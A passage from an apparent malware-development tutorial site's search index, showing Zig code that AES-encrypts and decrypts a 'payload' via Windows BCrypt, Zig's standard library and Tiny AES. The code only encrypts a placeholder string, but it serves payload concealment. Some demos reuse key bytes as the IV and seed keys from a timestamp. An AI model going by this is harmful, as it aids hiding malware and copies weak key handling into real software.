NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptEncrypt</code>:    Encrypts a block of data</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptEncrypt(\n    hKey: ?*anyopaque,\n    pbInput: [*]u8,\n    cbInput: ULONG,\n    pPaddingInfo: ?*anyopaque,\n    pbIV: [*]u8,\n    cbIV: ULONG,\n    pbOutput: ?[*]u8,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptDecrypt</code>:    Decrypts a block of data</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptDecrypt(\n    hKey: ?*anyopaque,\n    pbInput: [*]u8,\n    cbInput: ULONG,\n    pPaddingInfo: ?*anyopaque,\n    pbIV: [*]u8,\n    cbIV: ULONG,\n    pbOutput: ?[*]u8,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> </ol>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#padding","title":"Padding","text":"<p>Checking <code>NTSTATUS</code> and removing PKCS#7 padding from a decrypted data buffer</p> main.zig<pre><code>fn ntSuccess(status: NTSTATUS) bool {\n    return status &gt;= 0;\n}\n\n// Remove PKCS#7 padding from decrypted data\nfn removePkcs7Padding(data: []u8) ?[]u8 {\n    if (data.len == 0) return null;\n\n    const padding_length = data[data.len - 1];\n\n    // Validate padding length\n    if (padding_length == 0 or padding_length &gt; 16 or padding_length &gt; data.len) {\n        return null;\n    }\n\n    // Validate all padding bytes are the same\n    const start_index = data.len - padding_length;\n    for (data[start_index..]) |byte| {\n        if (byte != padding_length) {\n            return null;\n        }\n    }\n\n    return data[0..start_index];\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#encryption","title":"Encryption","text":"<p>Encrypting data using AES in CBC mode with PKCS#7 padding</p> main.zig<pre><code>// Encryption\nfn installAesEncryption(aes: *AES) bool {\n    var bSTATE: bool = true;\n    var hAlgorithm: ?*anyopaque = null;\n    var hKeyHandle: ?*anyopaque = null;\n\n    var cbResult: ULONG = 0;\n    var dwBlockSize: DWORD = 0;\n    var cbKeyObject: DWORD = 0;\n    var pbKeyObject: ?[*]u8 = null;\n    var pbCipherText: ?[*]u8 = null;\n    var cbCipherText: DWORD = 0;\n\n    var status: NTSTATUS = STATUS_SUCCESS;\n\n    blk: {\n        status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptOpenAlgorithmProvider Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"ObjectLength\"),\n            @ptrCast(&amp;cbKeyObject),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"BlockLength\"),\n            @ptrCast(&amp;dwBlockSize),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        if (dwBlockSize != 16) {\n            bSTATE = false;\n            break :blk;\n        }\n        pbKeyObject = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbKeyObject));\n        if (pbKeyObject == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptSetProperty(\n            hAlgorithm,\n            BCRYPT_CHAINING_MODE,\n            @ptrCast(@constCast(BCRYPT_CHAIN_MODE_CBC.ptr)),\n            @sizeOf(@TypeOf(BCRYPT_CHAIN_MODE_CBC)),\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptSetProperty Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGenerateSymmetricKey(\n            hAlgorithm,\n            &amp;hKeyHandle,\n            pbKeyObject.?,\n            cbKeyObject,\n            aes.pKey.?,\n            KEY_SIZE,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGenerateSymmetricKey Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptEncrypt(\n            hKeyHandle,\n            aes.pPlainText.?,\n            aes.dwPlainSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            null,\n            0,\n            &amp;cbCipherText,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptEncrypt[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        pbCipherText = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbCipherText));\n        if (pbCipherText == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptEncrypt(\n            hKeyHandle,\n            aes.pPlainText.?,\n            aes.dwPlainSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            pbCipherText,\n            cbCipherText,\n            &amp;cbResult,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptEncrypt[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n    }\n    if (hKeyHandle != null) _ = BCryptDestroyKey(hKeyHandle);\n    if (hAlgorithm != null) _ = BCryptCloseAlgorithmProvider(hAlgorithm, 0);\n    if (pbKeyObject != null) _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, pbKeyObject.?);\n    if (pbCipherText != null and bSTATE) {\n        aes.pCipherText = pbCipherText;\n        aes.dwCipherSize = cbCipherText;\n    }\n    return bSTATE;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#decryption","title":"Decryption","text":"<p>Decrypting data using AES in CBC mode, and then removing the PKCS#7 padding</p> main.zig<pre><code>// Decryption\nfn installAesDecryption(aes: *AES) bool {\n    var bSTATE: bool = true;\n    var hAlgorithm: ?*anyopaque = null;\n    var hKeyHandle: ?*anyopaque = null;\n\n    var cbResult: ULONG = 0;\n    var dwBlockSize: DWORD = 0;\n    var cbKeyObject: DWORD = 0;\n    var pbKeyObject: ?[*]u8 = null;\n    var pbPlainText: ?[*]u8 = null;\n    var cbPlainText: DWORD = 0;\n\n    var status: NTSTATUS = STATUS_SUCCESS;\n\n    blk: {\n        status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptOpenAlgorithmProvider Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"ObjectLength\"),\n            @ptrCast(&amp;cbKeyObject),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"BlockLength\"),\n            @ptrCast(&amp;dwBlockSize),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        if (dwBlockSize != 16) {\n            bSTATE = false;\n            break :blk;\n        }\n        pbKeyObject = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbKeyObject));\n        if (pbKeyObject == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptSetProperty(\n            hAlgorithm,\n            BCRYPT_CHAINING_MODE,\n            @ptrCast(@constCast(BCRYPT_CHAIN_MODE_CBC.ptr)),\n            @sizeOf(@TypeOf(BCRYPT_CHAIN_MODE_CBC)),\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptSetProperty Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGenerateSymmetricKey(\n            hAlgorithm,\n            &amp;hKeyHandle,\n            pbKeyObject.?,\n            cbKeyObject,\n            aes.pKey.?,\n            KEY_SIZE,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGenerateSymmetricKey Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptDecrypt(\n            hKeyHandle,\n            aes.pCipherText.?,\n            aes.dwCipherSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            null,\n            0,\n            &amp;cbPlainText,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptDecrypt[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        pbPlainText = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbPlainText));\n        if (pbPlainText == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptDecrypt(\n            hKeyHandle,\n            aes.pCipherText.?,\n            aes.dwCipherSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            pbPlainText,\n            cbPlainText,\n            &amp;cbResult,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptDecrypt[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n\n        // Remove PKCS#7 padding after successful decryption\n        if (pbPlainText != null and cbResult &gt; 0) {\n            const decrypted_data = pbPlainText.?[0..cbResult];\n            if (removePkcs7Padding(decrypted_data)) |unpadded| {\n                cbResult = @intCast(unpadded.len);\n            }\n        }\n    }\n    if (hKeyHandle != null) _ = BCryptDestroyKey(hKeyHandle);\n    if (hAlgorithm != null) _ = BCryptCloseAlgorithmProvider(hAlgorithm, 0);\n    if (pbKeyObject != null) _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, pbKeyObject.?);\n    if (pbPlainText != null and bSTATE) {\n        aes.pPlainText = pbPlainText;\n        aes.dwPlainSize = cbResult; // Use the adjusted size after padding removal\n    }\n    return bSTATE;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#customized-wrappers","title":"Customized Wrappers","text":"main.zig<pre><code>// Wrapper for encryption\nfn simpleEncryption(\n    pPlainTextData: [*]u8,\n    sPlainTextSize: u32,\n    pKey: [*]u8,\n    pIv: [*]u8,\n    pCipherTextData: *?[*]u8,\n    sCipherTextSize: *u32,\n) bool {\n    if (isNullPtr(pPlainTextData) or sPlainTextSize == 0 or isNullPtr(pKey) or isNullPtr(pIv))\n        return false;\n\n    var aes = AES{\n        .pKey = pKey,\n        .pIv = pIv,\n        .pPlainText = pPlainTextData,\n        .dwPlainSize = sPlainTextSize,\n        .pCipherText = null,\n        .dwCipherSize = 0,\n    };\n    if (!installAesEncryption(&amp;aes))\n        return false;\n    pCipherTextData.* = aes.pCipherText;\n    sCipherTextSize.* = aes.dwCipherSize;\n    return true;\n}\n\n// Wrapper for decryption\nfn simpleDecryption(\n    pCipherTextData: [*]u8,\n    sCipherTextSize: u32,\n    pKey: [*]u8,\n    pIv: [*]u8,\n    pPlainTextData: *?[*]u8,\n    sPlainTextSize: *u32,\n) bool {\n    if (isNullPtr(pCipherTextData) or sCipherTextSize == 0 or isNullPtr(pKey) or isNullPtr(pIv))\n        return false;\n\n    var aes = AES{\n        .pKey = pKey,\n        .pIv = pIv,\n        .pPlainText = null,\n        .dwPlainSize = 0,\n        .pCipherText = pCipherTextData,\n        .dwCipherSize = sCipherTextSize,\n    };\n    if (!installAesDecryption(&amp;aes))\n        return false;\n    pPlainTextData.* = aes.pPlainText;\n    sPlainTextSize.* = aes.dwPlainSize;\n    return true;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#demo","title":"Demo","text":"main.zig<pre><code>pub fn main() !void {\n    // --- DECRYPTION PART EXAMPLE ---\n    std.debug.print(\"--- DECRYPTION PART EXAMPLE ---\\n\\n\", .{});\n    var p_key = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46, 0x9E, 0xD0, 0x73, 0x1E, 0x7C, 0x8B, 0xCB, 0x72, 0xD9, 0x88, 0x01, 0x5F, 0xE3, 0x7B, 0x33, 0x63 };\n    var p_iv = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46 };\n    var ciphertext = [_]u8{ 0xBB, 0xF4, 0x2D, 0x43, 0x41, 0x72, 0x46, 0x6C, 0x9F, 0xE7, 0xF8, 0xF3, 0x49, 0xAF, 0x83, 0x69, 0xA5, 0x38, 0xBD, 0x0E, 0x56, 0x84, 0xF6, 0x6D, 0x88, 0x72, 0x26, 0x32, 0x5D, 0xBE, 0x1C, 0x70, 0xB4, 0x42, 0xAE, 0xBC, 0x70, 0x07, 0x87, 0x0C, 0x19, 0x5A, 0x79, 0xB2, 0x4B, 0x88, 0x83, 0xA9, 0x6C, 0x3A, 0xF8, 0x7B, 0x1E, 0x37, 0xD8, 0xAF, 0x36, 0x66, 0x30, 0x27, 0xFA, 0xE4, 0x80, 0x60 };\n    var p_plaintext: ?[*]u8 = null;\n    var dw_plain_size: u32 = 0;\n\n    if (!simpleDecryption(ciphertext[0..].ptr, ciphertext.len, p_key[0..].ptr, p_iv[0..].ptr, &amp;p_plaintext, &amp;dw_plain_size)) {\n        std.debug.print(\"Decryption failed!\\n\", .{});\n        return;\n    }\n    printHexData(\"p_key\", p_key[0..]);\n    printHexData(\"p_iv\", p_iv[0..]);\n    printHexData(\"ciphertext\", ciphertext[0..]);\n    printHexData(\"PlainTextInBytes\", p_plaintext.?[0..dw_plain_size]);\n    std.debug.print(\"PlainTextDecoded: {s}\\n\\n\", .{p_plaintext.?[0..dw_plain_size]});\n    _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, p_plaintext.?);\n\n    // --- ENCRYPTION PART EXAMPLE ---\n    std.debug.print(\"--- ENCRYPTION PART EXAMPLE ---\\n\\n\", .{});\n    var plaintext_data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n    var key = [_]u8{0} ** KEY_SIZE;\n    var iv = [_]u8{0} ** IV_SIZE;\n    generateRandomBytes(key[0..]);\n    generateRandomBytes(iv[0..]);\n    printHexData(\"pKey\", key[0..]);\n    printHexData(\"pIv\", iv[0..]);\n    printHexData(\"PlainTextInBytes\", plaintext_data[0..]);\n    std.debug.print(\"PlainTextDecoded: {s}\\n\\n\", .{plaintext_data[0..]});\n    var p_ciphertext: ?[*]u8 = null;\n    var dw_cipher_size: u32 = 0;\n    if (!simpleEncryption(plaintext_data[0..].ptr, plaintext_data.len, key[0..].ptr, iv[0..].ptr, &amp;p_ciphertext, &amp;dw_cipher_size)) {\n        std.debug.print(\"Encryption failed!\\n\", .{});\n        return;\n    }\n    printHexData(\"CipherText\", p_ciphertext.?[0..dw_cipher_size]);\n    _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, p_ciphertext.?);\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#using-standard-library","title":"Using Standard Library","text":""},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#padding_1","title":"Padding","text":"main.zig<pre><code>// Add PKCS#7 padding\nfn addPkcs7Padding(allocator: std.mem.Allocator, data: []const u8) ![]u8 {\n    const padding_needed = BLOCK_SIZE - (data.len % BLOCK_SIZE);\n    const padded_size = data.len + padding_needed;\n\n    var padded_data = try allocator.alloc(u8, padded_size);\n    @memcpy(padded_data[0..data.len], data);\n\n    // Fill padding bytes with the padding length value\n    @memset(padded_data[data.len..], @intCast(padding_needed));\n\n    return padded_data;\n}\n\n// Remove PKCS#7 padding\nfn removePkcs7Padding(allocator: std.mem.Allocator, data: []const u8) ![]u8 {\n    if (data.len == 0) return error.InvalidPadding;\n\n    const padding_length = data[data.len - 1];\n\n    // Validate padding length\n    if (padding_length == 0 or padding_length &gt; BLOCK_SIZE or padding_length &gt; data.len) {\n        return error.InvalidPadding;\n    }\n\n    // Validate all padding bytes are the same\n    const start_index = data.len - padding_length;\n    for (data[start_index..]) |byte| {\n        if (byte != padding_length) {\n            return error.InvalidPadding;\n        }\n    }\n\n    // Return unpadded data\n    const unpadded = try allocator.alloc(u8, start_index);\n    @memcpy(unpadded, data[0..start_index]);\n    return unpadded;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#encryption_1","title":"Encryption","text":"main.zig<pre><code>// AES-256-CBC Encryption\nfn aesEncrypt(allocator: std.mem.Allocator, plaintext: []const u8, key: []const u8, iv: []const u8) ![]u8 {\n    if (key.len != KEY_SIZE) return error.InvalidKeySize;\n    if (iv.len != IV_SIZE) return error.InvalidIvSize;\n\n    // Add PKCS#7 padding\n    const padded_plaintext = try addPkcs7Padding(allocator, plaintext);\n    defer allocator.free(padded_plaintext);\n\n    // Initialize AES context\n    const aes_ctx = Aes256.initEnc(key[0..32].*);\n\n    // Allocate memory for ciphertext\n    var ciphertext = try allocator.alloc(u8, padded_plaintext.len);\n\n    // Copy IV to working buffer\n    var working_iv: [IV_SIZE]u8 = undefined;\n    @memcpy(&amp;working_iv, iv[0..IV_SIZE]);\n\n    // Encrypt in CBC mode\n    var i: usize = 0;\n    while (i &lt; padded_plaintext.len) : (i += BLOCK_SIZE) {\n        // Prepare block for encryption\n        var block: [BLOCK_SIZE]u8 = undefined;\n\n        // XOR with IV/previous ciphertext block\n        for (0..BLOCK_SIZE) |j| {\n            block[j] = padded_plaintext[i + j] ^ working_iv[j];\n        }\n\n        // Encrypt the block\n        var encrypted_block: [BLOCK_SIZE]u8 = undefined;\n        aes_ctx.encrypt(&amp;encrypted_block, &amp;block);\n\n        // Copy encrypted block to ciphertext\n        @memcpy(ciphertext[i .. i + BLOCK_SIZE], &amp;encrypted_block);\n\n        // Update IV with current ciphertext block for next iteration\n        @memcpy(&amp;working_iv, &amp;encrypted_block);\n    }\n\n    return ciphertext;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#aes-256-cbc-decryption","title":"AES-256-CBC Decryption:","text":"main.zig<pre><code>// AES-256-CBC Decryption\nfn aesDecrypt(allocator: std.mem.Allocator, ciphertext: []const u8, key: []const u8, iv: []const u8) ![]u8 {\n    if (key.len != KEY_SIZE) return error.InvalidKeySize;\n    if (iv.len != IV_SIZE) return error.InvalidIvSize;\n    if (ciphertext.len % BLOCK_SIZE != 0) return error.InvalidCiphertextLength;\n\n    // Initialize AES context for decryption\n    const aes_ctx = Aes256.initDec(key[0..32].*);\n\n    // Allocate memory for plaintext\n    var plaintext = try allocator.alloc(u8, ciphertext.len);\n\n    // Copy IV to working buffer\n    var working_iv: [IV_SIZE]u8 = undefined;\n    @memcpy(&amp;working_iv, iv[0..IV_SIZE]);\n\n    // Decrypt in CBC mode\n    var i: usize = 0;\n    while (i &lt; ciphertext.len) : (i += BLOCK_SIZE) {\n        // Get current ciphertext block\n        var cipher_block: [BLOCK_SIZE]u8 = undefined;\n        @memcpy(&amp;cipher_block, ciphertext[i .. i + BLOCK_SIZE]);\n\n        // Decrypt the block\n        var decrypted_block: [BLOCK_SIZE]u8 = undefined;\n        aes_ctx.decrypt(&amp;decrypted_block, &amp;cipher_block);\n\n        // XOR with IV/previous ciphertext block\n        for (0..BLOCK_SIZE) |j| {\n            plaintext[i + j] = decrypted_block[j] ^ working_iv[j];\n        }\n\n        // Update IV with current ciphertext block for next iteration\n        @memcpy(&amp;working_iv, &amp;cipher_block);\n    }\n\n    // Remove PKCS#7 padding\n    const unpadded = try removePkcs7Padding(allocator, plaintext);\n    allocator.free(plaintext); // Free the padded version\n    return unpadded;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#customized-wrappers_1","title":"Customized Wrappers","text":"main.zig<pre><code>// Simple encryption wrapper\nfn simpleEncryption(\n    allocator: std.mem.Allocator,\n    plaintext_data: []const u8,\n    key: []const u8,\n    iv: []const u8,\n) ![]u8 {\n    return aesEncrypt(allocator, plaintext_data, key, iv);\n}\n\n// Simple decryption wrapper\nfn simpleDecryption(\n    allocator: std.mem.Allocator,\n    ciphertext_data: []const u8,\n    key: []const u8,\n    iv: []const u8,\n) ![]u8 {\n    return aesDecrypt(allocator, ciphertext_data, key, iv);\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#demo_1","title":"Demo","text":"main.zig<pre><code>pub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // --- DECRYPTION PART EXAMPLE ---\n    print(\"--- DECRYPTION PART EXAMPLE ---\\n\\n\", .{});\n\n    const p_key = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46, 0x9E, 0xD0, 0x73, 0x1E, 0x7C, 0x8B, 0xCB, 0x72, 0xD9, 0x88, 0x01, 0x5F, 0xE3, 0x7B, 0x33, 0x63 };\n    const p_iv = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46 };\n    const ciphertext = [_]u8{ 0xBB, 0xF4, 0x2D, 0x43, 0x41, 0x72, 0x46, 0x6C, 0x9F, 0xE7, 0xF8, 0xF3, 0x49, 0xAF, 0x83, 0x69, 0xA5, 0x38, 0xBD, 0x0E, 0x56, 0x84, 0xF6, 0x6D, 0x88, 0x72, 0x26, 0x32, 0x5D, 0xBE, 0x1C, 0x70, 0xB4, 0x42, 0xAE, 0xBC, 0x70, 0x07, 0x87, 0x0C, 0x19, 0x5A, 0x79, 0xB2, 0x4B, 0x88, 0x83, 0xA9, 0x6C, 0x3A, 0xF8, 0x7B, 0x1E, 0x37, 0xD8, 0xAF, 0x36, 0x66, 0x30, 0x27, 0xFA, 0xE4, 0x80, 0x60 };\n\n    const p_plaintext = simpleDecryption(allocator, &amp;ciphertext, &amp;p_key, &amp;p_iv) catch |err| {\n        print(\"Decryption failed: {}\\n\", .{err});\n        return;\n    };\n    defer allocator.free(p_plaintext);\n\n    printHexData(\"p_key\", &amp;p_key);\n    printHexData(\"p_iv\", &amp;p_iv);\n    printHexData(\"ciphertext\", &amp;ciphertext);\n    printHexData(\"PlainTextInBytes\", p_plaintext);\n    print(\"PlainTextDecoded: {s}\\n\\n\", .{p_plaintext});\n\n    // --- ENCRYPTION PART EXAMPLE ---\n    print(\"--- ENCRYPTION PART EXAMPLE ---\\n\\n\", .{});\n\n    const plaintext_data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n\n    var key: [KEY_SIZE]u8 = undefined;\n    var iv: [IV_SIZE]u8 = undefined;\n    try generateRandomBytes(&amp;key);\n    try generateRandomBytes(&amp;iv);\n\n    printHexData(\"pKey\", &amp;key);\n    printHexData(\"pIv\", &amp;iv);\n    printHexData(\"PlainTextInBytes\", &amp;plaintext_data);\n    print(\"PlainTextDecoded: {s}\\n\\n\", .{plaintext_data});\n\n    const p_ciphertext = simpleEncryption(allocator, &amp;plaintext_data, &amp;key, &amp;iv) catch |err| {\n        print(\"Encryption failed: {}\\n\", .{err});\n        return;\n    };\n    defer allocator.free(p_ciphertext);\n\n    printHexData(\"CipherText\", p_ciphertext);\n\n    // --- VERIFICATION: Decrypt what we just encrypted ---\n    print(\"--- VERIFICATION ---\\n\\n\", .{});\n\n    const verification_plaintext = simpleDecryption(allocator, p_ciphertext, &amp;key, &amp;iv) catch |err| {\n        print(\"Verification decryption failed: {}\\n\", .{err});\n        return;\n    };\n    defer allocator.free(verification_plaintext);\n\n    print(\"Verification PlainText: {s}\\n\", .{verification_plaintext});\n    print(\"Original == Decrypted: {}\\n\", .{std.mem.eql(u8, &amp;plaintext_data, verification_plaintext)});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#using-tiny-aes","title":"Using Tiny AES","text":"<p>Originl C project</p> <p>You should go to that project and download the <code>aes.h</code> &amp; <code>aes.c</code>, then put them into your <code>src</code> directory. Then you should add this to your <code>build.zig</code> to make the Zig compiler know where's your C source.</p> build.zig<pre><code>// NOTE: This allow the compiler to link the C source\nexe.addCSourceFile(.{ .file = b.path(\"src/aes.c\"), .flags = &amp;.{} });\nexe.addIncludePath(b.path(\"src\"));\nexe.linkLibC();\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#padding_2","title":"Padding","text":"main.zig<pre><code>// Padding buffer function\nfn padBuffer(\n    input_buffer: [*]const u8,\n    input_buffer_size: SIZE_T,\n    output_padded_buffer: *?[*]u8,\n    output_padded_size: *SIZE_T,\n) BOOL {\n    var padded_buffer: ?[*]u8 = null;\n    var padded_size: SIZE_T = 0;\n\n    // Calculate the nearest number that is multiple of 16\n    padded_size = input_buffer_size + 16 - (input_buffer_size % 16);\n\n    // Allocating buffer of size \"padded_size\"\n    padded_buffer = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, padded_size));\n    if (padded_buffer == null) {\n        return FALSE;\n    }\n\n    // Zero the allocated buffer\n    @memset(padded_buffer.?[0..padded_size], 0);\n\n    // Copy old buffer to new padded buffer\n    @memcpy(padded_buffer.?[0..input_buffer_size], input_buffer[0..input_buffer_size]);\n\n    // Save results\n    output_padded_buffer.* = padded_buffer;\n    output_padded_size.* = padded_size;\n\n    return TRUE;\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#encryption_2","title":"Encryption","text":"main.zig<pre><code>const c = @cImport({\n    @cInclude(\"./aes.h\")\n});\n\n// Encryption example (equivalent to first C program)\nfn aesEncrypt() void {\n    print(\"=== ENCRYPTION EXAMPLE ===\\n\\n\", .{});\n\n    // \"this is plane text sting, we'll try to encrypt... lets hope everythign go well :)\" in hex\n    var data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n\n    // Struct needed for Tiny-AES library\n    var ctx: c.struct_AES_ctx = undefined;\n\n    var p_key: [KEYSIZE]BYTE = undefined;\n    var p_iv: [IVSIZE]BYTE = undefined;\n\n    // Seed random number generator using Zig RNG\n    seedRng(@as(u64, @bitCast(time.timestamp())));\n    generateRandomBytes(&amp;p_key, KEYSIZE);\n\n    // Use first byte of key for additional randomness in IV generation\n    seedRng(@as(u64, @bitCast(time.timestamp())) ^ p_key[0]);\n    generateRandomBytes(&amp;p_iv, IVSIZE);\n\n    // Print key and IV\n    printHexData(\"pKey\", &amp;p_key, KEYSIZE);\n    printHexData(\"pIv\", &amp;p_iv, IVSIZE);\n\n    // Initialize Tiny-AES library\n    c.AES_init_ctx_iv(&amp;ctx, &amp;p_key, 